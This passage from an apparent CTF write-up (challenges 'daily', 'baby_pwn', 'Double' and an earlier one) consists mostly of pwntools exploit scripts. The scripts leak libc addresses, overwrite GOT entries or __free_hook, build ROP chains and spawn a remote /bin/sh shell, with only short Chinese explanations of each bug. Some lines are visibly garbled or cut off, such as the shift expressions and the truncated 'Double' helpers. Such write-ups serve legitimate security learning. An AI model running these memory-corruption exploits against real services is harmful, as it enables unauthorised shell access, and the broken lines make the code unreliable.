            p.recvuntil("now value(hex) ")
            temp = int(p.recvuntil("\n",drop=True)[-2:],16)
            print temp
            program_base = (program_base >i*8))
        for i in range(6):
            p.recvuntil("input index")
            p.sendline(str(start_offset+i))
            p.recvuntil("now value(hex) ")
            p.recvuntil("input new value")
            p.sendline(str((puts_got&(0xff>i*8))
        start_offset += 0x8
        for i in range(6):
            p.recvuntil("input index")
            p.sendline(str(start_offset+i))
            p.recvuntil("now value(hex) ")
            p.recvuntil("input new value")
            p.sendline(str((puts_addr&(0xff>i*8))
        start_offset += 0x8
        for i in range(6):
            p.recvuntil("input index")
            p.sendline(str(start_offset+i))
            p.recvuntil("now value(hex) ")
            p.recvuntil("input new value")
            p.sendline(str((main_addr&(0xff>i*8))
        for i in range(15):
            p.recvuntil("input index")
            p.sendline("1")
            p.recvuntil("input new value")
            p.sendline("1")
        #write ret value to one_gadget
        p.recvuntil("do you want continue(yes/no)? ")
        p.sendline("yes")
        p.recvuntil("\n")
        puts_addr = u64(p.recvuntil("\n",drop=True).ljust(8,"\x00"))
        success("puts : " + hex(puts_addr))
        p.recvuntil("input your name \nname:")
        p.send("\x00")
        libc_base = puts_addr - 0x6f690
        one_gadget = libc_base + 0x45216
        start_offset = 344
        for i in range(6):
            p.recvuntil("input index")
            p.sendline(str(start_offset+i))
            p.recvuntil("now value(hex) ")
            p.recvuntil("input new value")
            p.sendline(str((one_gadget&(0xff>i*8))
        for i in range(35):
            p.recvuntil("input index")
            p.sendline("1")
            p.recvuntil("input new value")
            p.sendline("1")
        p.recvuntil("do you want continue(yes/no)? ")
        p.sendline("no")
        p.interactive()
    if __name__ == "__main__":
        main()
### daily
free的时候没有检查index是否合法
    from pwn import *
    def show():
        p.sendafter(':', '1')
    def add(size, cont):
        p.sendafter(':', '2')
        p.sendafter('daily:', str(size))
        p.sendafter('\n', cont)
    def edit(idx, cont):
        p.sendafter(':', '3')
        p.sendafter(':', str(idx))
        p.sendafter('\n', cont)
    def free(idx):
        p.sendafter(':', '4')
        p.sendafter(':', str(idx))
    def leak():
        add(0x100, '0')
        add(0x100, '1')
        add(0x100, '2')
        add(0x100, '3')
        add(0x100, '4')
        free(3)
        free(1)
        free(4)
        free(2)
        free(0)
        add(0x100, '0'*8)
        add(0x210, '1'*8)
        add(0x100, '2'*8)
        show()
        p.recvuntil('1'*8)
        libc_base = u64(p.recvuntil('2 : '+'2'*8, drop=True).ljust(8, '\x00')) - 0x3c4b78
        heap = u64(p.recvuntil('=', drop=True).ljust(8, '\x00')) - 0x110
        free(0)
        free(1)
        free(2)
        return heap, libc_base
    def exploit(host, port=58512):
        global p
        if host:
            p = remote(host, port)
        else:
            p = process('./pwn', env={'LD_PRELOAD':'./libc.so.6'})
        gdb.attach(p, 'source ./gdb.script\n')
        heap, libc.address = leak()
        info('heap @ '+hex(heap))
        info('libc @ '+hex(libc.address))
        add(0x60, p64(0) + p64(heap+0x10))
        add(0x60, '/bin/sh\x00') #1
        add(0x7f, '2')
        free((heap+0x10-0x602060)/0x10)
        edit(0, p64(0x602078))
        add(0x60, '3') #0 
        add(0x60, p64(libc.sym['__free_hook'])) # point to address of #2 : 0x602088
        edit(2, p64(libc.sym['system']))
        free(1)
        p.interactive()
    if __name__ == '__main__':
        elf = ELF('./pwn')
        libc = ELF('./libc.so.6')
        exploit(args['REMOTE'])
### baby_pwn
通过爆破修改`alarm@got`最低位指向`sysenter`从而判断远程libc版本，再利用read()使得`eax=sys_write`即可泄露
    from pwn import *
    context.update(os='linux', arch='i386')
    def exploit(host, port=33865):
        if host:
            p = remote(host, port)
        else:
            p = process('./pwn', env={'LD_PRELOAD':'./libc6-i386_2.23-0ubuntu11_amd64.so'})
            gdb.attach(p, 'source ./gdb.script')
        ropchain = [
            elf.plt['read'], p_esi_edi_ebp_r,
            0, elf.got['alarm'], 1,
            elf.plt['read'], p_esi_edi_ebp_r,
            0, 0x0804A000, 0x100,
            p_ebx_r, 1,
            elf.plt['alarm'],
            elf.plt['read'], p_esi_edi_ebp_r,
            0, elf.got['setvbuf'], 0x10,
            elf.plt['setvbuf'], 0,
            elf.got['setvbuf']+4,
        ]
        p.send(('A'*40 + 'B'*4 + flat(ropchain)).ljust(0x100, '\x00'))
        p.send('\x2b')
        p.send('\x00'*4)
        p.recv(0xc)
        libc.address = u32(p.recv(4)) - libc.sym['read']
        info('libc.address @ '+hex(libc.address))
        p.send(p32(libc.sym['system']) + '/bin/sh\x00')
        p.interactive()
    if __name__ == '__main__':
        elf = ELF('./pwn')
        libc = ELF('./libc6-i386_2.23-0ubuntu11_amd64.so')
        p_ebx_esi_edi_ebp_r = 0x080485d8 # pop ebx ; pop esi ; pop edi ; pop ebp ; ret
        p_esi_edi_ebp_r = 0x080485d9 # pop esi ; pop edi ; pop ebp ; ret
        p_ebx_r = 0x0804837d # pop ebx ; ret
        exploit(args['REMOTE'])
### Double
数据为单向链表结构，在`add()`时通过添加两次相同数据，可以触发fastbin attack，将堆块分配至bss段，从而修改链表头指针，达到任意读写
    from pwn import *
    def add(data):
        p.sendlineafter('> ', '1')
        if len(data) ', '2')
        p.sendlineafter('index: ', str(idx))
    def edit(idx, data):
        p.sendlineafter('> ', '3')
        p.sendlineafter('index: ', str(idx))
        if len(data) ', '4')